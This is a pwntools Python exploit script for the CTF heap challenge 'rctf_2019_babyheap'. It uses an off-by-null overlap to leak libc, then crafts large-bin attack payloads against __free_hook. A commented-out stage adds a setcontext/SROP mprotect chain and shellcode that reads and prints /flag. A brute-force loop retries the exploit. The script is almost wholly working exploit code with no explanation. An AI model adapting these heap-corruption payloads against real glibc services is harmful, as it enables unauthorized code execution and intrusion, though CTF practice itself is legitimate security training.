from pwn import *

#r = remote("node3.buuoj.cn", 27089)
#r = process("./rctf_2019_babyheap")

context(log_level = 'debug', arch = 'amd64', os = 'linux')
DEBUG = 0
if DEBUG:
	gdb.attach(r, 
	'''	
	b *$rebase(0xC2B)
	x/10gx $rebase(0x202110)
	c
	''')

elf = ELF("./rctf_2019_babyheap")
libc = ELF('../../libc/16-64-libc-2.23.so')
one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]
r = process("./rctf_2019_babyheap")
menu = "Choice: \n"
def add(size):
	r.recvuntil(menu)
	r.sendline('1')
	r.recvuntil("Size: ")
	r.sendline(str(size))

def delete(index):
	r.recvuntil(menu)
	r.sendline('3')
	r.recvuntil("Index: ")
	r.sendline(str(index))

def show(index):
	r.recvuntil(menu)
	r.sendline('4')
	r.recvuntil("Index: ")
	r.sendline(str(index))

def edit(index, content):
	r.recvuntil(menu)
	r.sendline('2')
	r.recvuntil("Index: ")
	r.sendline(str(index))
	r.recvuntil("Content: ")
	r.send(content)

def pwn():
	libc.address = 0
	add(0x80)#0
	add(0x68)#1
	add(0xf0)#2
	add(0x18)#3
	delete(0)
	payload = 'a'*0x60 + p64(0x100)
	edit(1, payload)
	delete(2)
	add(0x80)#0
	show(1)
	malloc_hook = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
	libc.address = malloc_hook - libc.sym['__malloc_hook']
	system = libc.sym['system']
	free_hook = libc.sym['__free_hook']
	set_context = libc.symbols['setcontext']
	success("libc_base:"+hex(libc.address))
	add(0x160)#2

	add(0x18)#4
	add(0x508)#5
	add(0x18)#6
	add(0x18)#7
	add(0x508)#8
	add(0x18)#9
	add(0x18)#10

	edit(5, 'a'*0x4f0+p64(0x500))
	delete(5)
	edit(4, 'a'*0x18)
	add(0x18)#5
	add(0x4d8)#11
	delete(5)
	delete(6)
	add(0x30)#5
	add(0x4e8)#6

	edit(8, 'a'*0x4f0+p64(0x500))
	delete(8)
	edit(7, 'a'*0x18)
	add(0x18)#8
	add(0x4d8)#12
	delete(8)
	delete(9)
	add(0x40)#8
	delete(6)
	add(0x4e8)#6
	delete(6)
	#pause()

	storage = free_hook
	fake_chunk = storage - 0x20
	payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
	edit(11, payload)
	payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
	edit(12, payload)
	add(0x48)#6
	r.interactive()
	# sleep(0.5)
	# gdb.attach(r)
	# pause()
	# new_addr =  free_hook &0xFFFFFFFFFFFFF000
	# shellcode1 = '''
	# xor rdi,rdi
	# mov rsi,%d
	# mov edx,0x1000

	# mov eax,0
	# syscall

	# jmp rsi
	# ''' % new_addr
	# edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))

	# frame = SigreturnFrame()
	# frame.rsp = free_hook+0x10
	# frame.rdi = new_addr
	# frame.rsi = 0x1000
	# frame.rdx = 7
	# frame.rip = libc.sym['mprotect']
	# edit(12, str(frame))
	# delete(12)
	# sleep(0.5)

	# shellcode2 = '''
	# mov rax, 0x67616c662f ;// /flag
	# push rax

	# mov rdi, rsp ;// /flag
	# mov rsi, 0 ;// O_RDONLY
	# xor rdx, rdx ;
	# mov rax, 2 ;// SYS_open
	# syscall

	# mov rdi, rax ;// fd 
	# mov rsi,rsp  ;
	# mov rdx, 1024 ;// nbytes
	# mov rax,0 ;// SYS_read
	# syscall

	# mov rdi, 1 ;// fd 
	# mov rsi, rsp ;// buf
	# mov rdx, rax ;// count 
	# mov rax, 1 ;// SYS_write
	# syscall

	# mov rdi, 0 ;// error_code
	# mov rax, 60
	# syscall
	# '''
	# r.sendline(asm(shellcode2))

	# r.interactive()

if __name__ == "__main__":
	#pwn()

	while True:
		r = process("./rctf_2019_babyheap")
		try:
			pwn()
		except:
			r.close()